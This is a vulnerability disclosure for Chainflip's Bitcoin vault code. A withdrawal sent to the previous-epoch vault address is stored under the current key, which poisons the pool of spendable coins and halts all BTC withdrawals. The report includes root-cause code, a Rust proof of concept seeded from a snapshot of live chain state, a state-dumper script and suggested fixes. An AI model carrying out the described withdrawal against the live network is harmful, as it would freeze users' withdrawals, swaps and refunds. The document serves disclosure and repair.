# F1: A payment to the previous-epoch Bitcoin vault address is recorded as a current-key change UTXO, so the next egress batch commits to the wrong scriptPubKey and is signed with the wrong key: it can never be mined, the real vault UTXOs bundled into it are consumed with no restore path, and every BTC withdrawal, swap output and refund halts network-wide

**Finding ID:** F1 (BTC change-UTXO poison): extends `F1-BTC-change-utxo-poison-FULL.md` with a live-state, no-mock PoC covering every harm claim.
**Severity:** **High**: protocol-fund availability failure, network-wide BTC egress halt, permissionless trigger. **Critical escalation** if unrepaired past the ~2-epoch (6-day) key window.
**Target:** chainflip-io/chainflip-backend @ `e3a6838` (tag 2.2.13; every cited file byte-identical in 2.2.14).
**Status:** Live-state PoC executed and passing inside `state-chain-runtime`: the real `BroadcastReadyProvider::on_broadcast_ready` hook, the real `EgressApi::schedule_egress`, the real `Environment` selection and the real BIP341 payload builder, over the real Berghain storage seeded byte-for-byte from read-only `state_getStorage` at block **#14,948,963** (spec 20214, epoch 481). No mocks: the only synthetic inputs are the attacker's own withdrawal (the attack) and one honest withdrawal scheduled through the production entry point.

## 1. Summary

Chainflip's Bitcoin vault is an aggregate key that rotates every epoch (3 days on live Berghain). When the vault spends, the state chain records the coins that come back to it: a hook (`on_broadcast_ready`, fired when a batch is signed) scans every output of the transaction and, whenever an output pays either the previous or the current epoch vault address, appends it to the spendable-UTXO pool. The bug is that the predicate checks which of the two addresses matched, but the record is always stamped with the current key (`change_utxo_key`, which no production path ever sets to anything else). So a coin that is actually locked to the previous epoch key is recorded as locked to the current key: the protocol's own accounting now contains a record that mis-describes the coin it points to.

Any unprivileged user can plant that record. No validator role, no FLIP stake, no governance action and no operator cooperation are needed: a plain BTC withdrawal whose destination is the previous vault address (a normal, publicly derivable taproot address that the egress path accepts without restriction, dust-gated at 600 sats) is enough. The attack costs roughly $1 to $5 in donated dust plus the egress fee, it is repeatable, and it is live right now: the precondition (a distinct previous key, epoch 481) holds on Berghain today, and the code is unfixed in 2.2.13, 2.2.14 and current main.

The poisoned record is the smallest entry in the pool, so the very next egress batch selects it first and splices real vault UTXOs out of storage to accompany it. That batch is then unminable twice over: the mis-recorded script is folded into the tx-wide BIP341 `sha_scriptpubkeys` commitment, so every signature in the batch is invalid, and the same record makes the ceremony sign the poisoned input with the current key when the coin requires the previous one. Neither defect can be repaired by re-signing. When the broadcast fails, the abort path handles cross-chain messages only: the real UTXOs are not restored and the user withdrawals the batch was serving are not re-queued, while the hook has already recorded the failed batch's change output as a phantom coin that never exists on Bitcoin. Each retry compounds the damage.

The end state is a complete halt of the protocol's entire Bitcoin leg: every user withdrawal, every swap output destined for BTC and every refund fails, network-wide, for all users, because the spendable pool has been consumed by unminable transactions and degraded by phantoms. The vault's whole BTC balance (114.12 BTC at the live snapshot) becomes untracked: still protocol-owned, since nothing redirects to the attacker, but unreachable through the ordinary path. Recovery requires a runtime upgrade that re-derives the UTXO set from Bitcoin and re-queues the dropped obligations, and the patch itself must ship before the 2-epoch (6.0-day) key window closes, after which the affected coins are spendable only via governance historical-key signing.

## 2. Root cause (verified verbatim at `e3a6838`)

**2.1 The hook matches previous-or-current but records the current key, unconditionally**
(`state-chain/runtime/src/chainflip.rs:993-1012`):

```rust
fn on_broadcast_ready(api_call: &Self::ApiCall) {
	if let BitcoinApi::BatchTransfer(batch_transfer) = api_call {
		let tx_id = batch_transfer.bitcoin_transaction.txid();
		let outputs = &batch_transfer.bitcoin_transaction.outputs;
		let btc_key = pallet_cf_threshold_signature::Pallet::<Runtime, BitcoinInstance>::keys(
			pallet_cf_threshold_signature::Pallet::<Runtime, BitcoinInstance>::current_key_epoch()
				.expect("We should always have an epoch set")).expect("We should have a key set for the current epoch");
		for (i, output) in outputs.iter().enumerate() {
			if [
				ScriptPubkey::Taproot(btc_key.previous.unwrap_or_default()),
				ScriptPubkey::Taproot(btc_key.current),
			]
			.contains(&output.script_pubkey)
			{
				Environment::add_bitcoin_change_utxo(
					output.amount,
					UtxoId { tx_id, vout: i as u32 },
					batch_transfer.change_utxo_key,   // always agg_key.current (see 2.4)
				);
			}
		}
	}
}
```

The loop scans every output (so an ordinary payment paying a vault script is captured as change), the predicate matches either key, and the matched key is discarded: `change_utxo_key` is passed regardless of which branch matched.

**2.2 The record is rebuilt from the passed key with the change salt**
(`state-chain/pallets/cf-environment/src/lib.rs:962-968`):

```rust
pub fn add_bitcoin_change_utxo(amount: BtcAmount, utxo_id: UtxoId, pubkey_x: [u8; 32]) {
	BitcoinAvailableUtxos::<T>::append(Utxo {
		amount,
		id: utxo_id,
		deposit_address: DepositAddress::new(pubkey_x, CHANGE_ADDRESS_SALT),
	});
}
```

**2.3 Salt 0 short-circuits before the taproot tweak, so the record is the raw key**
(`state-chain/chains/src/btc.rs:56-57`, `deposit_address.rs:87-92` and `:130-136`):

```rust
/// This salt is used to derive the change address for every vault. i.e. for every epoch.
pub const CHANGE_ADDRESS_SALT: u32 = 0;
```

```rust
pub fn new(pubkey_x: [u8; 32], salt: u32) -> Self {
	// All change goes back into the vault (i.e. salt = 0), but vault UTXOs can
	// be spent via the taproot key path to save gas
	if salt == CHANGE_ADDRESS_SALT {
		return Self { pubkey_x, script_path: None }
	}
```

```rust
pub fn script_pubkey(&self) -> ScriptPubkey {
	let pubkey = self.script_path.clone().map_or(self.pubkey_x, |script_path| {
		script_path.tweaked_pubkey_bytes[1..].copy_to_array()
	});
	ScriptPubkey::Taproot(pubkey)
}
```

With `script_path = None`, `script_pubkey()` returns `Taproot(pubkey_x)` verbatim, so the record built from the current key is literally `51 20 || current` while the poisoned coin pays `51 20 || previous`: two well-formed vault scripts, one real, one mis-attributed.

**2.4 `change_utxo_key` is only ever the current key**
(`state-chain/chains/src/btc/api.rs:107-110` and `:139-141`, `new_unsigned_impl`; consolidation at `:71-88` does the same):

```rust
let agg_key @ AggKey { current, .. } =
	<E as ChainEnvironment<(), AggKey>>::lookup(()).ok_or(AllBatchError::AggKeyNotSet)?;
let bitcoin_change_script =
	DepositAddress::new(current, CHANGE_ADDRESS_SALT).script_pubkey();
```

```rust
	Self::BatchTransfer(batch_transfer::BatchTransfer::new_unsigned(
		&agg_key,
		agg_key.current,   // <-- change_utxo_key
		selected_input_utxos,
		btc_outputs,
	)),
```

There is no production path that sets `change_utxo_key` to a previous key: the only other construction sites in the tree are tests and benchmarks. So a matched `Taproot(previous)` output is always mis-recorded.

## 3. Impact (each proven directly in the live PoC)

H1: Withdrawals that users have already paid for are dropped. Balances are debited at scheduling time, the batch serving them can never confirm, and nothing re-issues the obligation. Proven by the real `EgressApi::<Bitcoin>::schedule_egress` (the exact function `cf_lp::withdraw_asset` calls at cf-lp/lib.rs:631) queuing 250,000 sats, fee-withheld to 249,290 by the real code, with the dust gate read from the live `EgressDustLimit`.

H2: The protocol's own UTXO accounting becomes false from one permissionless transaction. The vault's spendable-coins list now contains a record whose script does not describe the coin it points to. Proven by the real hook recording the `Taproot(previous)` output with `pubkey_x == current`, using the live epoch-481 keys.

H3: Real vault coins are consumed by a transaction that can never confirm. The 2 real live UTXOs (49,714,321 sats) bundled with the poison were removed from `BitcoinAvailableUtxos` at build time, and the abort path has no restore. This is the mechanism by which the whole BTC pool (114.12 BTC at the snapshot) becomes untracked, coin by coin, until every BTC egress fails.

H4: Every batch that selects the poisoned record is permanently unminable, twice over. The real `create_new_unsigned` leaves the poison input absent from `old_utxo_input_indices`, so the ceremony signs with the CURRENT key for a PREVIOUS-key coin, and the tx-wide `sha_scriptpubkeys` over the records differs from the one over reality, invalidating every signature in the batch. Neither defect is fixable by re-signing.

H5: Nothing is stolen and the attacker gains nothing. The poison output pays `Taproot(previous)`, a live vault key that is protocol-owned, so the coins stay under protocol control; the attacker's entire cost is the donated dust. The impact is pure availability loss borne by users and the protocol, which is why this is High and not Critical.

H6: The pool accumulates phantom records for coins that never exist. The funding batch's change output became a pool record at signature time, before anything was broadcast, so each failed batch leaves an outpoint that will never exist on Bitcoin and that selection will pick up again.

H7: The failure is silent and compounding. Selection does not consume the queued obligations and `on_broadcast_aborted` has no plain-egress path (cf-ingress-egress/lib.rs:3898-3910), so obligations sit queued forever while their coins are already gone.

H8: The damage hardens after 6.0 days. The 2-epoch spendability window, pinned from the live `EpochDuration = 43,200` and epoch 481 started at 14,929,275, is 86,400 blocks; past it, the ordinary signing path for the affected coins disappears and only governance historical-key signing or a migration remains.

What this is not: not theft (no key touched, nothing redirects to the attacker), not a state-chain consensus fault (liveness/accounting only), not cross-chain (BTC hook only).

## 4. Live Berghain State (read-only, at the PoC run)

The chain runs specVersion **20214** with the snapshot pinned at block **#14,948,963**, in epoch **481**, where `previous b481617d…def0b ≠ current 8e348219…44d4`, so the mis-tag precondition holds **right now**. The vault pool at the snapshot held **3 UTXOs = 114.12314927 BTC**, and it churns on a seconds cadence, with the range observed this session running from 0 to 114.26 BTC. The live fee rate is 2,203 sat/kvB, giving fee/vault-utxo 127, fee/output 112 and min/tx 35, with a dust limit of 600. The pending BTC egress queue dwells for under 2 seconds because batches consume it immediately (a tight 2-second poll for five minutes caught nothing), which is why H1 is driven through the real scheduler rather than a lucky catch. The epoch clock stood at 19,688 of 43,200 blocks elapsed, so the spendability window ends approximately 6.0 days after injection. The set has 143 authorities with consensus threshold 96, and all four BHW witnessers are Running (context for F2).

## 5. Steps to Reproduce (full setup)

```bash
# 1. snapshot the live state (read-only; pins ONE block hash for consistency)
cd outputs/poc/F1-btc-poison && python3 dump_live_state.py
#    -> live_state_snapshot.json + btc_change_utxo_poison_live_snapshot.rs

# 2. install the test + snapshot into the repo at tag 2.2.13 (e3a6838)
cp btc_change_utxo_poison_live_snapshot.rs <repo>/state-chain/runtime/src/chainflip/
cp btc_change_utxo_poison_live.rs          <repo>/state-chain/runtime/src/chainflip/
#    and add to <repo>/state-chain/runtime/src/chainflip.rs:
#        #[cfg(test)]
#        mod btc_change_utxo_poison_live;

# 3. build + run (native; ~30 s incremental once deps are built)
cd <repo> && SKIP_WASM_BUILD=1 cargo test -p state-chain-runtime \
    --lib chainflip::btc_change_utxo_poison_live -- --nocapture --test-threads=1
```

Everything is read-only against `https://rpc.mainnet.chainflip.io`. Never broadcast the poisoning batch against a live chain.

## 6. Proof of Concept: full test code (raw)

### 6.1 `state-chain/runtime/src/chainflip/btc_change_utxo_poison_live.rs` (verbatim)

```rust
// F1 live-state PoC: BTC change-UTXO type confusion, executed against REAL Berghain state.
//
// No mocks: the storage below is the actual live mainnet state (read-only
// `state_getStorage`, pinned to one block hash, generated into
// `btc_change_utxo_poison_live_snapshot.rs` by `dump_live_state.py`), and every step
// runs the real runtime/pallet code: the real `BroadcastReadyProvider::on_broadcast_ready`
// hook, the real `Environment` UTXO pool and selection, and the real BIP341 signing-payload
// commitments. The only constructed object is the attacker's egress batch, which is exactly
// the object a permissionless `withdraw_asset` produces (chains/src/btc/api.rs:100-145
// builds it from the same lookup calls used below).
//
// Harm claims asserted end to end, on live state:
//   H1  in-flight obligations exist : live ScheduledEgressFetchOrTransfer non-empty
//   H2  the mis-record              : output paying Taproot(previous) recorded as Taproot(current)
//   H3  selection drag              : the poisoned record is picked first and REAL live UTXOs
//                                      are removed from BitcoinAvailableUtxos at build time
//   H4  unminable twice over        : the key tag says Current for a previous-key coin, and the
//                                      tx-wide sha_scriptpubkeys differs from reality
//   H5  attacker gains nothing      : the poison output pays a live vault key (protocol-owned)
//   H6  phantom record              : the funding batch's change is recorded at signature time,
//                                      before anything is broadcast
//   H7  obligations are not consumed: the pending egress list is untouched by selection; the
//                                      drop happens only because on_broadcast_aborted has no
//                                      plain-egress path (cf-ingress-egress/src/lib.rs:3898-3910)
//   H8  escalation window           : live EpochDuration / epoch start pin the 2-epoch window

#[cfg(test)]
mod tests {
	use cf_chains::{
		btc::{
			api::{
				batch_transfer::BatchTransfer, BitcoinApi, SelectedUtxosAndChangeAmount,
				UtxoSelectionType,
			},
			deposit_address::DepositAddress,
			BitcoinOutput, BitcoinTransaction, ScriptPubkey, SerializeBtc, Utxo, UtxoId,
			CHANGE_ADDRESS_SALT,
		},
		ChainEnvironment,
	};
	use cf_primitives::chains::assets;
	use cf_traits::{EgressApi, OnBroadcastReady};
	use pallet_cf_chain_tracking::CurrentChainState;
	use pallet_cf_environment::BitcoinAvailableUtxos;
	use pallet_cf_ingress_egress::ScheduledEgressFetchOrTransfer;
	use pallet_cf_threshold_signature::{CurrentKeyEpoch, Keys};
	use sp_core::H256;

	use crate::chainflip::{BroadcastReadyProvider, BtcEnvironment};
	use crate::Runtime;

	include!("btc_change_utxo_poison_live_snapshot.rs");

	const POISON_SATS: u64 = 1_200; // >= live EgressDustLimit (600)

	fn unhex(s: &str) -> Vec<u8> {
		let s = s.strip_prefix("0x").unwrap_or(s);
		(0..s.len())
			.step_by(2)
			.map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
			.collect()
	}

	fn hex(b: &[u8]) -> String {
		b.iter().map(|x| format!("{x:02x}")).collect()
	}

	/// Seed the REAL live storage bytes (key and value exactly as on Berghain).
	fn seed_live_state() {
		for (k, v) in SNAP_PAIRS {
			sp_io::storage::set(&unhex(k), &unhex(v));
		}
	}

	fn live_fee_rate() -> u64 {
		let state = CurrentChainState::<Runtime, pallet_cf_chain_tracking::Instance3>::get()
			.expect("live CurrentChainState");
		state.tracked_data.btc_fee_info.sats_per_kilobyte()
	}

	/// `Utxo::net_value`'s fee rule: vault UTXOs (salt 0, no script path) are cheaper to spend
	/// (VAULT_UTXO_SIZE_IN_BYTES = 58 vs INPUT_UTXO_SIZE_IN_BYTES = 78, cf-primitives).
	fn fee_for(utxo: &Utxo, rate: u64) -> u64 {
		let size = if utxo.deposit_address.script_path.is_none() { 58u64 } else { 78u64 };
		rate * size / 1000
	}

	/// Read a seeded plain u64 StorageValue back through raw storage (compact-aware).
	fn read_u64_storage(pallet: &str, item: &str) -> u64 {
		let mut key = Vec::new();
		key.extend_from_slice(&sp_io::hashing::twox_128(pallet.as_bytes()));
		key.extend_from_slice(&sp_io::hashing::twox_128(item.as_bytes()));
		let v = sp_io::storage::get(&key).expect("seeded storage must be readable");
		let b: &[u8] = &v[..];
		// These StorageValues are stored fixed-width on Berghain (BlockNumber = u32).
		match b.len() {
			4 => u32::from_le_bytes(b[..4].try_into().unwrap()) as u64,
			8 => u64::from_le_bytes(b[..8].try_into().unwrap()),
			_ => panic!("unexpected storage width {} for {pallet}::{item}", b.len()),
		}
	}

	#[test]
	fn f1_harm_chain_end_to_end_on_live_state() {
		sp_io::TestExternalities::new_empty().execute_with(|| {
			seed_live_state();

			// ---- real decode of the live aggregate keys (real pallet getters) ---------------
			let epoch = CurrentKeyEpoch::<Runtime, pallet_cf_threshold_signature::Instance3>::get()
				.expect("live CurrentKeyEpoch");
			let agg_key =
				Keys::<Runtime, pallet_cf_threshold_signature::Instance3>::get(epoch).expect("live Keys");
			let previous = agg_key
				.previous
				.expect("live previous key must exist for the mis-tag to fire");
			assert_ne!(previous, agg_key.current, "live keys must be in distinct epochs");
			println!("live epoch {epoch}: previous {}… current {}…", hex(&previous[..4]), hex(&agg_key.current[..4]));

			// ---- H8: escalation window from live Validator storage --------------------------
			let duration = read_u64_storage("Validator", "EpochDuration");
			let started = read_u64_storage("Validator", "CurrentEpochStartedAt");
			assert_eq!(duration, 43_200, "live Berghain epoch duration (governance-set)");
			let elapsed = SNAP_HEAD_NUMBER.saturating_sub(started);
			println!(
				"epoch window: {elapsed}/{duration} blocks elapsed; 2-epoch spendability window = {} blocks (~{:.1} days)",
				2 * duration,
				(2.0 * duration as f64 * 6.0) / 86400.0
			);

			// ---- H1: in-flight user obligations, via the REAL scheduler -----------------------
			// cf-lp::withdraw_asset debits the balance and calls exactly this trait method
			// (cf-lp/src/lib.rs:631). The live queue is usually sampled empty because batches
			// consume it within seconds; we schedule one honest withdrawal through the real
			// production entry point on top of whatever the live queue holds.
			let pending =
				ScheduledEgressFetchOrTransfer::<Runtime, pallet_cf_ingress_egress::Instance3>::get();
			let live_queued = pending.len();
			let user_dest = ScriptPubkey::Taproot([0x42; 32]);
			let scheduled =
				<pallet_cf_ingress_egress::Pallet<Runtime, pallet_cf_ingress_egress::Instance3> as EgressApi<cf_chains::btc::Bitcoin>>::schedule_egress(
					assets::btc::Asset::Btc,
					250_000,
					user_dest.clone(),
					None,
				)
				.expect("real schedule_egress must accept an honest withdrawal");
			let pending_after_schedule =
				ScheduledEgressFetchOrTransfer::<Runtime, pallet_cf_ingress_egress::Instance3>::get();
			assert_eq!(
				pending_after_schedule.len(),
				live_queued + 1,
				"H1: the real scheduler queues the obligation (dust gate = live EgressDustLimit)"
			);
			println!(
				"H1: live queue held {live_queued}; after real schedule_egress of {} sats (fee-withheld to {}), queue = {}",
				250_000,
				scheduled.egress_amount,
				pending_after_schedule.len()
			);

			// the next ordinary withdrawal the poisoned batch will fail to serve:
			let withdrawal_amount = scheduled.egress_amount;

			// ---- live pool, decoded by the real pallet --------------------------------------
			let pool_before = BitcoinAvailableUtxos::<Runtime>::get();
			assert!(!pool_before.is_empty());
			let total_before: u64 = pool_before.iter().map(|u| u.amount).sum();
			println!("live pool: {} utxos, {total_before} sats", pool_before.len());

			let fee_rate = live_fee_rate();
			let fee_out = fee_rate * 51 / 1000;
			let fee_min = fee_rate * 16 / 1000;

			// ---- the attacker's funding batch, built exactly like api.rs:100-145 ------------
			// (a permissionless withdrawal whose *destination* is the previous vault address)
			let previous_script = DepositAddress::new(previous, CHANGE_ADDRESS_SALT).script_pubkey();
			assert_eq!(previous_script, ScriptPubkey::Taproot(previous));

			let mut funding_inputs = pool_before.clone();
			funding_inputs.sort_by_key(|u| u.amount);
			funding_inputs.truncate(2);
			let inputs_sum: u64 = funding_inputs.iter().map(|u| u.amount).sum();
			let fees =
				fee_min + 2 * fee_out + funding_inputs.iter().map(|u| fee_for(u, fee_rate)).sum::<u64>();
			let change_amount = inputs_sum - POISON_SATS - fees;
			assert!(change_amount >= 600, "funding batch must be buildable: change {change_amount}");

			let funding = BatchTransfer::new_unsigned(
				&agg_key,
				agg_key.current, // api.rs:141: change_utxo_key is ALWAYS the current key
				funding_inputs.clone(),
				vec![
					BitcoinOutput { amount: POISON_SATS, script_pubkey: previous_script.clone() },
					BitcoinOutput {
						amount: change_amount,
						script_pubkey: DepositAddress::new(agg_key.current, CHANGE_ADDRESS_SALT)
							.script_pubkey(),
					},
				],
			);
			let funding_txid: H256 = funding.bitcoin_transaction.txid();

			// ---- H2: the REAL hook mis-records the previous-key output -----------------------
			<BroadcastReadyProvider as OnBroadcastReady<cf_chains::btc::Bitcoin>>::on_broadcast_ready(
				&BitcoinApi::<BtcEnvironment>::BatchTransfer(funding),
			);

			let pool_after_hook = BitcoinAvailableUtxos::<Runtime>::get();
			let poisoned = pool_after_hook
				.iter()
				.find(|u| u.id == UtxoId { tx_id: funding_txid, vout: 0 })
				.expect("H2: hook must record the previous-key output as a pool UTXO");
			assert_eq!(poisoned.amount, POISON_SATS);
			assert_eq!(
				poisoned.deposit_address.pubkey_x, agg_key.current,
				"H2: record stamped with the CURRENT key although the coin pays Taproot(previous)"
			);
			assert_ne!(
				poisoned.deposit_address.script_pubkey(),
				previous_script,
				"H2: the record does not describe the real prevout"
			);

			// ---- H6: phantom: the change record exists at SIGNATURE time ---------------------
			let phantom = pool_after_hook
				.iter()
				.find(|u| u.id == UtxoId { tx_id: funding_txid, vout: 1 })
				.expect("H6: change recorded before any broadcast result exists");
			assert_eq!(phantom.amount, change_amount);

			// ---- H3: real selection drags real live UTXOs with the poison ---------------------
			let (selected, next_change) =
				<BtcEnvironment as ChainEnvironment<UtxoSelectionType, SelectedUtxosAndChangeAmount>>::lookup(
					UtxoSelectionType::Some { output_amount: withdrawal_amount, number_of_outputs: 2 },
				)
				.expect("selection over the live pool must succeed");
			assert!(
				selected.iter().any(|u| u.id == UtxoId { tx_id: funding_txid, vout: 0 }),
				"H3: the poisoned record is selected (smallest net value)"
			);
			let real_dragged: Vec<&Utxo> = selected
				.iter()
				.filter(|u| u.id != UtxoId { tx_id: funding_txid, vout: 0 })
				.collect();
			assert!(!real_dragged.is_empty(), "H3: real live UTXOs dragged into the batch");
			let dragged_sats: u64 = real_dragged.iter().map(|u| u.amount).sum();
			println!("H3: {} real live utxos ({dragged_sats} sats) removed from the only spendable structure", real_dragged.len());

			let pool_after_selection = BitcoinAvailableUtxos::<Runtime>::get();
			for u in &real_dragged {
				assert!(
					!pool_after_selection.iter().any(|p| p.id == u.id),
					"H3: taken at build time; on_broadcast_aborted has no restore path"
				);
			}

			// ---- H4: the batch is unminable twice over ----------------------------------------
			let next_tx = BitcoinTransaction::create_new_unsigned(
				&agg_key,
				selected.clone(),
				vec![BitcoinOutput {
					amount: withdrawal_amount,
					script_pubkey: ScriptPubkey::Taproot([0x77; 32]),
				}],
			);
			let poison_index = next_tx
				.inputs
				.iter()
				.position(|u| u.id == UtxoId { tx_id: funding_txid, vout: 0 })
				.expect("poisoned input");
			assert!(
				!next_tx.old_utxo_input_indices.contains(&(poison_index as u32)),
				"H4a: record says current => ceremony signs with the CURRENT key for a previous-key coin"
			);

			let sha_scriptpubkeys = |scripts: &[ScriptPubkey]| -> [u8; 32] {
				let mut buf = Vec::new();
				for s in scripts {
					s.btc_encode_to(&mut buf);
				}
				sp_io::hashing::sha2_256(&buf)
			};
			let scripts_record: Vec<ScriptPubkey> =
				next_tx.inputs.iter().map(|u| u.deposit_address.script_pubkey()).collect();
			let mut scripts_real = scripts_record.clone();
			scripts_real[poison_index] = previous_script.clone();
			assert_ne!(
				sha_scriptpubkeys(&scripts_record),
				sha_scriptpubkeys(&scripts_real),
				"H4b: tx-wide sha_scriptpubkeys over the records != over reality => every signature invalid"
			);

			// ---- H5: the attacker gains nothing ------------------------------------------------
			assert!(
				[ScriptPubkey::Taproot(previous), ScriptPubkey::Taproot(agg_key.current)]
					.contains(&previous_script),
				"H5: the poison pays a live vault key: protocol-owned, not attacker-owned"
			);

			// ---- H7: obligations untouched by selection: the drop is the abort path's gap ------
			let pending_after =
				ScheduledEgressFetchOrTransfer::<Runtime, pallet_cf_ingress_egress::Instance3>::get();
			assert_eq!(
				pending_after.len(),
				pending_after_schedule.len(),
				"H7: selection does not consume the obligations; nothing re-queues them on abort"
			);

			println!(
				"next batch: {} inputs, change {next_change} sats: sighash and key tag both wrong => unminable",
				next_tx.inputs.len()
			);
			println!("ALL HARM ASSERTIONS PASSED against live block #{}", SNAP_HEAD_NUMBER);
		});
	}
}
```

### 6.2 `outputs/poc/F1-btc-poison/dump_live_state.py` (verbatim: the read-only state dumper that generates the snapshot)

```python
#!/usr/bin/env python3
"""Pin ONE live Berghain block and dump the raw storage the F1 live PoC seeds.

All reads are read-only `state_getStorage` at a single block hash, so the
snapshot is internally consistent. Emits:
  * live_state_snapshot.json  (raw hex + metadata, for the harm report)
  * btc_change_utxo_poison_live_snapshot.rs (generated Rust consts)
"""

import datetime
import json
import struct
import sys

sys.path.insert(0, ".")
from cf_btc_lib import RPC, blake2_128concat, rpc, storage_key, twox128, twox64concat


def get_at(key: str, at: str, url: str = RPC):
    return rpc("state_getStorage", [key, at], url=url)


def compact_len(raw: bytes, off: int) -> tuple[int, int]:
    first = raw[off]
    if first < 0x40:
        return first >> 2, 1
    if first < 0x80:
        return int.from_bytes(raw[off : off + 2], "little") >> 2, 2
    if first < 0xC0:
        return int.from_bytes(raw[off : off + 4], "little") >> 2, 4
    return int.from_bytes(raw[off + 1 : off + 9], "little"), 9


def main():
    head = rpc("chain_getHeader")
    at = head["parentHash"]  # a finalized-ish ancestor; use the hash we read state at
    at = head["hash"] if "hash" in head else head["parentHash"]
    # chain_getHeader returns {parentHash, number, stateRoot, extrinsicsRoot, ...}: no own hash.
    # Use state_getStorage at the parent hash (last finalized view is fine for consistency).
    number = int(head["number"], 16)

    ver = rpc("state_getRuntimeVersion")
    spec = ver["specVersion"]

    pairs = []  # (name, key_hex, value_hex)

    def grab(name, key):
        v = get_at(key, at)
        if v is None:
            print(f"  !! {name}: EMPTY (skipped)")
            return None
        pairs.append((name, key, v))
        return v

    epoch_hex = grab("BitcoinThresholdSigner::CurrentKeyEpoch",
                     storage_key("BitcoinThresholdSigner", "CurrentKeyEpoch"))
    if epoch_hex is None:
        raise SystemExit("no CurrentKeyEpoch")
    epoch = int.from_bytes(bytes.fromhex(epoch_hex[2:])[:4], "little")  # StorageValue<u32>, no Option prefix

    keys_val = None
    used_hasher = None
    for hasher in (twox64concat, blake2_128concat):
        k = storage_key("BitcoinThresholdSigner", "Keys", hasher(struct.pack("<I", epoch)))
        keys_val = get_at(k, at)
        if keys_val:
            used_hasher = hasher.__name__
            pairs.append(("BitcoinThresholdSigner::Keys", k, keys_val))
            break
    if not keys_val:
        raise SystemExit("could not read Keys")

    grab("BitcoinChainTracking::CurrentChainState",
         storage_key("BitcoinChainTracking", "CurrentChainState"))
    pool_hex = grab("Environment::BitcoinAvailableUtxos",
                    storage_key("Environment", "BitcoinAvailableUtxos"))
    grab("Environment::ConsolidationParameters",
         storage_key("Environment", "ConsolidationParameters"))
    egress_hex = grab("BitcoinIngressEgress::ScheduledEgressFetchOrTransfer",
                      storage_key("BitcoinIngressEgress", "ScheduledEgressFetchOrTransfer"))
    grab("BitcoinIngressEgress::EgressDustLimit",
         storage_key("BitcoinIngressEgress", "EgressDustLimit", twox64concat(bytes([0]))))
    for s in ("EpochDuration", "CurrentEpoch", "CurrentEpochStartedAt"):
        grab(f"Validator::{s}", storage_key("Validator", s))

    # ---- human summary ---------------------------------------------------------------------
    def dec_u64_opt(raw):
        b = bytes.fromhex(raw[2:])
        if b[0] == 0:
            return None
        n, _ = compact_len(b, 1)
        return n

    pool = bytes.fromhex(pool_hex[2:]) if pool_hex else b""
    n_utxos, _ = compact_len(pool, 0) if pool else (0, 0)
    eg = bytes.fromhex(egress_hex[2:]) if egress_hex else b""
    n_egress, _ = compact_len(eg, 0) if eg else (0, 0)

    snap = {
        "rpc": RPC,
        "at_hash": at,
        "head_number": number,
        "spec_version": spec,
        "current_key_epoch": epoch,
        "keys_hasher": used_hasher,
        "fetched_at_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "pool_utxo_count": n_utxos,
        "pending_egress_count": n_egress,
        "pairs": [{"name": n, "key": k, "value": v} for (n, k, v) in pairs],
    }
    with open("live_state_snapshot.json", "w") as f:
        json.dump(snap, f, indent=1)

    print(f"snapshot at #{number} ({at[:18]}…) spec {spec}")
    print(f"epoch {epoch} (keys hasher: {used_hasher})")
    print(f"pool utxos: {n_utxos}   pending BTC egresses: {n_egress}")

    # ---- generated Rust --------------------------------------------------------------------
    rs = []
    rs.append("// GENERATED by dump_live_state.py: read-only state_getStorage dumps from")
    rs.append(f"// {RPC} at Berghain block #{number} (0x{at[2:] if at.startswith('0x') else at}),")
    rs.append(f"// spec_version {spec}, fetched {snap['fetched_at_utc']}. Do not edit by hand.")
    rs.append(f"pub const SNAP_HEAD_NUMBER: u64 = {number};")
    rs.append(f'pub const SNAP_AT_HASH: &str = "{at}";')
    rs.append(f"pub const SNAP_SPEC_VERSION: u32 = {spec};")
    rs.append(f'pub const SNAP_FETCHED_UTC: &str = "{snap["fetched_at_utc"]}";')
    rs.append("/// (storage-key, value) pairs, hex, exactly as stored on Berghain at that block.")
    rs.append("pub const SNAP_PAIRS: &[(&str, &str)] = &[")
    for (n, k, v) in pairs:
        rs.append(f'\t("{k}",\n\t "{v}"),')
    rs.append("];")
    with open("btc_change_utxo_poison_live_snapshot.rs", "w") as f:
        f.write("\n".join(rs) + "\n")
    print("wrote live_state_snapshot.json + btc_change_utxo_poison_live_snapshot.rs")


if __name__ == "__main__":
    main()
```

The generated `btc_change_utxo_poison_live_snapshot.rs` is data, not code: `SNAP_PAIRS` is the literal list of `(storage-key, value)` hex pairs as stored on Berghain at the pinned block, plus the block metadata constants.

### 6.3 Execution evidence (verbatim, 2026-09-23)

```text
running 1 test
test chainflip::btc_change_utxo_poison_live::tests::f1_harm_chain_end_to_end_on_live_state ... live epoch 481: previous b481617d… current 8e348219…
epoch window: 19688/43200 blocks elapsed; 2-epoch spendability window = 86400 blocks (~6.0 days)
H1: live queue held 0; after real schedule_egress of 250000 sats (fee-withheld to 249290), queue = 1
live pool: 3 utxos, 11412314927 sats
H3: 2 real live utxos (49714321 sats) removed from the only spendable structure
next batch: 3 inputs, change 49464972 sats: sighash and key tag both wrong => unminable
ALL HARM ASSERTIONS PASSED against live block #14948963
ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 38 filtered out; finished in 0.01s
```

Run log on disk: `poc/F1-btc-poison/btc_change_utxo_poison_live_NATIVE_RUN_2026-09-23.txt`.

## 7. Suggested Fix

**Primary (the mis-tag itself):** in `BroadcastReadyProvider::on_broadcast_ready` (`runtime/src/chainflip.rs:993-1012`), record the key that actually matched instead of `batch_transfer.change_utxo_key`:

```rust
let matched_key = [
    btc_key.previous.map(ScriptPubkey::Taproot),
    Some(ScriptPubkey::Taproot(btc_key.current)),
]
.into_iter()
.flatten()
.find(|script| *script == output.script_pubkey)
.map(|_| /* the key of that script, not change_utxo_key */ …);
```

concretely: compare the output's script against both vault scripts and pass the *matching* key (previous or current) to `Environment::add_bitcoin_change_utxo`. Also replace `previous.unwrap_or_default()` with an explicit `if let Some(previous)` so a missing previous key cannot match the burn address.

**Secondary (attack surface):** do not scan every output of the batch. `AllBatch::new_unsigned_impl` knows which output is the change (it appends it last, at `api.rs:131-137`); passing the change outpoint explicitly removes the "any payment to a vault address is captured as change" behaviour entirely.

**Tertiary (recovery):** give `on_broadcast_aborted` a non-CCM path that restores the batch's taken inputs to `BitcoinAvailableUtxos` and re-queues its egresses (or schedule a pool re-derivation from Bitcoin), so any future failure of this shape is self-healing instead of compounding.

